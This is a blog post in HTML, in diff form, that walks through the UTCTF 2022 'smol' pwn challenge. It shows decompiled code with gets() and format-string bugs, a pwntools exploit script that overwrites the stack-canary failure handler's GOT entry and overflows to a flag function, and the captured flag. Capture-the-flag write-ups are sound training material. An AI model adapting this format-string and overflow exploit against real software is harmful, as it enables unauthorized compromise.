@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Smol Overflow</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Smol Overflow</h1>
+    </header>
+
+    <div class="content">
+        <pre style="background-color:#212733;color:#ccc9c2;"><code><span>You can have a little overflow, as a treat
+</span><span>
+</span><span>By Tristan (@trab on discord)
+</span><span>nc pwn.utctf.live 5004 
+</span></code></pre>
+<p><a href="/utctf-2022/bins/smol">smol</a></p>
+<p><img src="/utctf-2022/smol_checksec.png" alt="checksec of smol; no PIE but it has a canary" /></p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>
+</span><span>undefined8 </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">char</span><span> cVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  ulong uVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>pcVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte bVar5</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_158 [</span><span style="color:#ffcc66;">111</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined4 uStack233</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined2 uStack229</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_78 [</span><span style="color:#ffcc66;">104</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  bVar5 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;What kind of data do you have?&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">gets</span><span>(local_158)</span><span style="color:#ccc9c2cc;">;
+</span><span>  iVar2 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span>(local_158</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;big data&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(iVar2 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>    uVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0xffffffffffffffff</span><span style="color:#ccc9c2cc;">;
+</span><span>    pcVar4 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">do </span><span>{
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(uVar3 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>      uVar3 </span><span style="color:#f29e74;">=</span><span> uVar3 </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      cVar1 </span><span style="color:#f29e74;">= *</span><span>pcVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>      pcVar4 </span><span style="color:#f29e74;">=</span><span> pcVar4 </span><span style="color:#f29e74;">+ </span><span>(ulong)bVar5 </span><span style="color:#f29e74;">* -</span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>    } </span><span style="color:#ffa759;">while </span><span>(cVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&#39;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ ~</span><span>uVar3) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x30322025</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f29e74;">*</span><span>(undefined2 </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack229 </span><span style="color:#f29e74;">+ ~</span><span>uVar3) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x73</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">else </span><span>{
+</span><span>    iVar2 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span>(local_158</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;smol data&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(iVar2 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>      uVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0xffffffffffffffff</span><span style="color:#ccc9c2cc;">;
+</span><span>      pcVar4 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">do </span><span>{
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(uVar3 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>        uVar3 </span><span style="color:#f29e74;">=</span><span> uVar3 </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>        cVar1 </span><span style="color:#f29e74;">= *</span><span>pcVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>        pcVar4 </span><span style="color:#f29e74;">=</span><span> pcVar4 </span><span style="color:#f29e74;">+ </span><span>(ulong)bVar5 </span><span style="color:#f29e74;">* -</span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      } </span><span style="color:#ffa759;">while </span><span>(cVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&#39;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ ~</span><span>uVar3) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x73352025</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#f29e74;">*</span><span>(undefined </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack229 </span><span style="color:#f29e74;">+ ~</span><span>uVar3) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">else </span><span>{
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Error&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Give me your data&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">gets</span><span>(local_78)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span>local_78)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">putchar</span><span>(</span><span style="color:#ffcc66;">10</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">!= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)) {
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>The big takeaway I get from this is that it's vulnerable as fuck. Multiple gets calls, and a sus printf. A naive overflow can't exploit this because of the canary but we also have a printf which uses a stack string as the format string. This is unimaginably suspicious to me because honestly no good reason why it shouldn't be an unwritable constant string. A little investigation on how it gets populated (in two conditional blocks, branched based on strcmp) shows that if neither of those strcmp calls match then the stack string is uninitialized.</p>
+<p>At this point the general structure of the attack is clear</p>
+<ol>
+<li>Overflow the "what kind of data" prompt to fill the stack string with whatever we want and not match either big or smol data.</li>
+<li>Rewrite the GOT entry for <code>__stack_chk_fail</code> to a ret gadget</li>
+<li>ROP to get_flag.</li>
+</ol>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./smol_patched&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>        </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>            gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">attach</span><span>(r)
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;pwn.utctf.live&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5004</span><span>)
+</span><span>    </span><span style="color:#ffa759;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">fmtstr_payload</span><span>(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span>{exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;__stack_chk_fail&#39;</span><span>]</span><span style="color:#ccc9c2cc;">: </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\xc3</span><span style="color:#bae67e;">&#39;</span><span>))})
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">112 </span><span style="color:#f29e74;">+ </span><span>payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">120 </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;get_flag&#39;</span><span>]))
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>utflag{just_a_little_salami15983350}</p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">13 March 2022</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/pwn/">#pwn</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
